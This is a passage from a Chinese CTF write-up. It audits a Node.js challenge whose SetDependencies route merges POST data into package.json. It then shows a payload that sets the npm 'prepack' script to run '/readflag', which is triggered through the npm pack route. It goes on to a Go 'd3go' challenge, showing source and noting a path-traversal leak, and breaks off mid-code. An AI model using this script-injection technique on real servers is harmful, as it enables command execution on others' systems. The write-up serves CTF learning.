function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: <span class="string">&quot;Pack dependencies success&quot;</span>,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Kill installing dependencies</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&quot;/KillDependencies&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(!req.<span class="property">session</span>.<span class="property">is_login</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_admin</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: <span class="string">&quot;You are not admin&quot;</span>,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Killing dependencies...&quot;</span>);</span><br><span class="line">    cp.<span class="title function_">exec</span>(<span class="string">&quot;ps -ef | grep npm | grep -v grep | awk &#x27;&#123;print $2&#125;&#x27; | xargs kill -9&quot;</span>,<span class="function">(<span class="params">err,stdout,stderr</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (err)&#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: <span class="string">&quot;Kill installing dependencies error&quot;</span>,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: <span class="string">&quot;Kill installing dependencies success&quot;</span>,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Logout</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&quot;/Logout&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_login</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    req.<span class="property">session</span>.<span class="property">is_login</span> = <span class="number">0</span>;</span><br><span class="line">    req.<span class="property">session</span>.<span class="property">is_admin</span> = <span class="number">0</span>;</span><br><span class="line">    req.<span class="property">session</span>.<span class="property">user</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后就开始审计代码了，可以看网页上路由的代码了 </p><p><code>// Set dependencies</code>路由</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">all</span>(<span class="string">&quot;/SetDependencies&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_login</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_admin</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(<span class="string">&quot;You are not admin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> === <span class="string">&quot;GET&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;You can post the dependencies here&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> === <span class="string">&quot;POST&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> data = req.<span class="property">body</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span> data !== <span class="string">&quot;object&quot;</span> &amp;&amp; data === &#123;&#125;)&#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;plz set the dependencies&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_">checkFileData</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data)))&#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;Invalid dependencies&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> exampleJson = &#123;</span><br><span class="line">            <span class="string">&quot;name&quot;</span>: <span class="string">&quot;app-example&quot;</span>,</span><br><span class="line">            <span class="string">&quot;version&quot;</span>: <span class="string">&quot;1.0.0&quot;</span>,</span><br><span class="line">            <span class="string">&quot;description&quot;</span>: <span class="string">&quot;Example app for the Node.js Getting Started guide.&quot;</span>,</span><br><span class="line">            <span class="string">&quot;author&quot;</span>: <span class="string">&quot;anonymous&quot;</span>,</span><br><span class="line">            <span class="string">&quot;scripts&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;prepack&quot;</span>: <span class="string">&quot;echo &#x27;packing dependencies&#x27;&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;license&quot;</span>: <span class="string">&quot;MIT&quot;</span>,</span><br><span class="line">            <span class="string">&quot;dependencies&quot;</span>: &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        exampleJson = <span class="title class_">Object</span>.<span class="title function_">assign</span>(exampleJson,&#123;&#125;,data);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> filePath = path.<span class="title function_">join</span>(__dirname,<span class="string">&quot;../public/package.json&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> fileData = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(exampleJson);</span><br><span class="line"></span><br><span class="line">        fs.<span class="title function_">writeFile</span>(filePath,fileData,<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (err)&#123;</span><br><span class="line">                <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&quot;Set dependencies error&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;Set dependencies success&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里由于这个post值可控，于是data就可控</p><p><img src="../images/image-20230504195748835.png" alt="image-20230504195748835"></p><p><img src="../images/image-20230504195839820.png" alt="image-20230504195839820"></p><p>这段代码定义了一个 JavaScript 对象 <code>exampleJson</code>，表示一个 Node.js 应用程序的 <strong>package.json</strong> 文件内容。这个对象包含了应用程序的名称、版本、描述、作者、脚本、许可证和依赖项等信息。</p><p><code>Object.assign</code> 方法用于将新的属性值合并到现有对象中。这里，我们将空对象 <code>&#123;&#125;</code> 作为第二个参数传递给 <code>Object.assign</code>，因此不会修改现有对象 <code>exampleJson</code>，而是返回一个新对象，该对象包含 <code>exampleJson</code> 的所有属性以及在 <code>data</code> 对象中定义的任何新属性。</p><p>如果 <code>data</code> 对象中定义了与 <code>exampleJson</code> 中相同的属性，则将覆盖原有属性。因此，可以通过 <code>Object.assign</code> 方法来修改或更新现有对象的属性。<strong>在这个例子中，我们使用 <code>Object.assign</code> 来将 <code>data</code> 对象的属性值合并到 <code>exampleJson</code> 对象中，实现了更新 package.json 文件内容的目的。</strong></p><p><code>//PackDependencies</code>路由</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">get</span>(<span class="string">&quot;/PackDependencies&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_login</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_admin</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: <span class="string">&quot;You are not admin&quot;</span>,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Packing dependencies...&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> filePath = path.<span class="title function_">join</span>(__dirname,<span class="string">&quot;../public&quot;</span>);</span><br><span class="line">    cp.<span class="title function_">exec</span>(<span class="string">&quot;cd &quot;</span> + filePath + <span class="string">&quot;&amp;&amp; npm pack &amp;&amp; mv ./*.tgz ./packs&quot;</span>,<span class="function">(<span class="params">err,stdout,stderr</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(err)&#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: <span class="string">&quot;Pack dependencies error&quot;</span>,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: <span class="string">&quot;Pack dependencies success&quot;</span>,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>这里面的有个执行函数，他的意思是</p><p><code>cp.exec(&quot;cd &quot; + filePath + &quot;&amp;&amp; npm pack &amp;&amp; mv ./*.tgz ./packs&quot;,(err,stdout,stderr) =&gt; &#123;</code> <code>npm pack</code>就相当与重新加载里面的json数据会变成我们改变过的，然后exec执行</p><p><img src="../images/image-20230504200640051.png" alt="image-20230504200640051"></p><p>接下来我们就可以使用临时文件来替换这个代码，因为临时目录下文件权限较高</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> exampleJson = </span><br><span class="line">&#123;</span><br><span class="line"><span class="string">&quot;name&quot;</span>: <span class="string">&quot;app-example&quot;</span>,</span><br><span class="line"><span class="string">&quot;version&quot;</span>: <span class="string">&quot;1.0.0&quot;</span>,</span><br><span class="line"><span class="string">&quot;description&quot;</span>: <span class="string">&quot;Example app for the Node.js Getting Started guide.&quot;</span>,</span><br><span class="line"><span class="string">&quot;author&quot;</span>: <span class="string">&quot;anonymous&quot;</span>,</span><br><span class="line"><span class="string">&quot;scripts&quot;</span>:&#123;</span><br><span class="line"><span class="string">&quot;prepack&quot;</span>: <span class="string">&quot;/readflag &gt; /tmp/y0&quot;</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="string">&quot;license&quot;</span>: <span class="string">&quot;MIT&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后最后通过show路由就可以成功进行文件查看了</p><p><img src="../images/image-20230504201002030.png" alt="image-20230504201002030"></p><p>先去  <code>url/dashboardIndex/SetDependencies</code>  这个网址来进行<strong>package.json</strong>内容的修改</p><p><img src="../images/image-20230504205510103.png" alt="image-20230504205510103"></p><p><strong>这里是别忘改了，不然上传不成功</strong></p><p>然后去<code>url/dashboardIndex/PackDependencies</code>路由进行npm pack 重新加载json数据，然后进行exec数据的执行</p><p><img src="../images/image-20230504202007954.png" alt="image-20230504202007954"></p><p>然后去<code>url/dashboardIndex/ShowExampleFile</code>路由进行文件的读取</p><p><img src="../images/image-20230504205542586.png" alt="image-20230504205542586"></p><p>成功</p><p><strong>这里考察的nosql的MongoDB盲注，app黑名单绕过，nodejs代码审计，npm pack的重新加载</strong></p><p>这道题能学到挺多东西的</p><h2 id="d3go"><a href="#d3go" class="headerlink" title="d3go"></a>d3go</h2><p><strong>bs是go编程语言的新手，最近发现新特性“go embed”很有意思。他写了一个在线解压服务，使用go embed打包静态资源文件。您的任务是利用此应用程序的漏洞，对其进行 RCE 并获取标志。</strong></p><p><strong>一开始会显示ERR_EMPTY_RESPONSE，请稍候刷新！</strong></p><p><strong>提示：</strong></p><p><strong>d3go 的Gamebox 无法连接到Internet。</strong></p><p>题目</p><p><img src="../images/image-20230505192100368.png" alt="image-20230505192100368"></p><p><code>go embed</code> 的错误使用导致源代码被打包到程序中。</p><p>这与不正确的静态文件服务相结合，导致/../路径列表⽬录以获取源代码。</p><p><img src="../images/image-20230505192841822.png" alt="image-20230505192841822"></p><p><strong>main.go</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;crypto/rand&quot;</span></span><br><span class="line"><span class="string">&quot;d3go/config&quot;</span></span><br><span class="line"><span class="string">&quot;d3go/controller&quot;</span></span><br><span class="line"><span class="string">&quot;d3go/db&quot;</span></span><br><span class="line"><span class="string">&quot;d3go/middleware&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gin-contrib/sessions&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gin-contrib/sessions/cookie&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/jpillora/overseer&quot;</span></span><br><span class="line">log <span class="string">&quot;github.com/sirupsen/logrus&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line"><span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">prog</span><span class="params">(state overseer.State)</span></span> &#123;</span><br><span class="line">r := gin.Default()</span><br><span class="line">InitRouter(r)</span><br><span class="line">server := http.Server&#123;</span><br><span class="line">Addr:    <span class="string">&quot;:8080&quot;</span>,</span><br><span class="line">Handler: r,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> err := server.Serve(state.Listener); err != <span class="literal">nil</span> &amp;&amp; err != http.ErrServerClosed &#123;</span><br><span class="line">log.Fatal(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;()</span><br><span class="line">&lt;-state.GracefulShutdown</span><br><span class="line"><span class="keyword">if</span> err := server.Shutdown(<span class="literal">nil</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatal(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">config.Init()</span><br><span class="line">db.Init()</span><br><span class="line"><span class="keyword">if</span> config.Conf.AutoUpdate &#123;</span><br><span class="line">log.Printf(<span class="string">&quot;Auto update enabled&quot;</span>)</span><br><span class="line">err := overseer.RunErr(overseer.Config&#123;</span><br><span class="line">Program: prog,</span><br><span class="line">Address: <span class="string">&quot;:8080&quot;</span>,</span><br><span class="line">Fetcher: &amp;config.Fetch,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">r := gin.Default()</span><br><span class="line">InitRouter(r)</span><br><span class="line"><span class="keyword">if</span> err := r.Run(<span class="string">&quot;:8080&quot;</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatal(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">InitRouter</span><span class="params">(r *gin.Engine)</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> rad [<span class="number">32</span>]<span class="type">byte</span></span><br><span class="line">rand.Read(rad[:])</span><br><span class="line">store := cookie.NewStore(rad[:])</span><br><span class="line">r.Use(sessions.Sessions(<span class="string">&quot;mysession&quot;</span>, store))</span><br><span class="line">r.POST(<span class="string">&quot;/login&quot;</span>, controller.Login)</span><br><span class="line">r.POST(<span class="string">&quot;/register&quot;</span>, controller.Register)</span><br><span class="line">r.GET(<span class="string">&quot;/*filepath&quot;</span>, ServeFile)</span><br><span class="line">r.HEAD(<span class="string">&quot;/*filepath&quot;</span>, ServeFile)</span><br><span class="line">admin := r.Group(<span class="string">&quot;/admin&quot;</span>)</span><br><span class="line">admin.Use(middleware.Auth())</span><br><span class="line">admin.POST(<span class="string">&quot;/upload&quot;</span>, controller.Upload)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ServeFile</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line"><span class="comment">// unzipped file server</span></span><br><span class="line">p := c.Param(<span class="string">&quot;filepath&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> strings.HasPrefix(p, <span class="string">&quot;/unzipped&quot;</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(p) == <span class="number">9</span> &#123;</span><br><span class="line">p = <span class="string">&quot;/&quot;</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">p = p[<span class="number">9</span>:]</span><br><span class="line">&#125;</span><br><span class="line">c.FileFromFS(p, http.Dir(<span class="string">&quot;./unzipped&quot;</span>))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// embed static file server</span></span><br><span class="line">p = <span class="string">&quot;/static/&quot;</span> + c.Param(<span class="string">&quot;filepath&quot;</span>)</span><br><span class="line">c.FileFromFS(p, http.FS(Static))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>config.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> config</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;github.com/fsnotify/fsnotify&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/jpillora/overseer/fetcher&quot;</span></span><br><span class="line">log <span class="string">&quot;github.com/sirupsen/logrus&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/spf13/viper&quot;</span></span><br><span class="line"><span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> Conf config</span><br><span class="line"><span class="keyword">var</span> Fetch fetcher.HTTP</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> config <span class="keyword">struct</span> &#123;</span><br><span class="line">NoAdminLogin <span class="type">bool</span></span><br><span class="line">DBUser       <span class="type">string</span></span><br><span class="line">DBPasswd     <span class="type">string</span></span><br><span class="line">DBHost       <span class="type">string</span></span><br><span class="line">DBPort       <span class="type">string</span></span><br><span class="line">AutoUpdate   <span class="type">bool</span></span><br><span class="line">UpdateUrl    <span class="type">string</span></span><br><span class="line">UpdateTime   time.Duration</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Init</span><span class="params">()</span></span> &#123;</span><br><span class="line">viper.SetConfigName(<span class="string">&quot;config&quot;</span>)</span><br><span class="line">viper.SetConfigType(<span class="string">&quot;yaml&quot;</span>)</span><br><span class="line">viper.AddConfigPath(<span class="string">&quot;.&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err := viper.ReadInConfig(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(err)</span><br><span class="line">&#125;</span><br><span class="line">UpdateConfig()</span><br><span class="line">viper.OnConfigChange(<span class="function"><span class="keyword">func</span><span class="params">(in fsnotify.Event)</span></span> &#123;</span><br><span class="line">UpdateConfig()</span><br><span class="line">&#125;)</span><br><span class="line">viper.WatchConfig()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">UpdateConfig</span><span class="params">()</span></span> &#123;</span><br><span class="line">Conf.DBUser = viper.GetString(<span class="string">&quot;database.user&quot;</span>)</span><br><span class="line">Conf.DBPasswd = viper.GetString(<span class="string">&quot;database.password&quot;</span>)</span><br><span class="line">Conf.DBHost = viper.GetString(<span class="string">&quot;database.host&quot;</span>)</span><br><span class="line">Conf.DBPort = viper.GetString(<span class="string">&quot;database.port&quot;</span>)</span><br><span class="line">Conf.NoAdminLogin = viper.GetBool(<span class="string">&quot;server.noAdminLogin&quot;</span>)</span><br><span class="line">Conf.AutoUpdate = viper.GetBool(<span class="string">&quot;update.enabled&quot;</span>)</span><br><span class="line">Fetch = fetcher.HTTP&#123;</span><br><span class="line">URL:      viper.GetString(<span class="string">&quot;update.url&quot;</span>),</span><br><span class="line">Interval: viper.GetDuration(<span class="string">&quot;update.interval&quot;</span>) * time.Second,</span><br><span class="line">&#125;</span><br><span class="line">Fetch.Init()</span><br><span class="line">log.Println(<span class="string">&quot;config updated&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>controller.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span 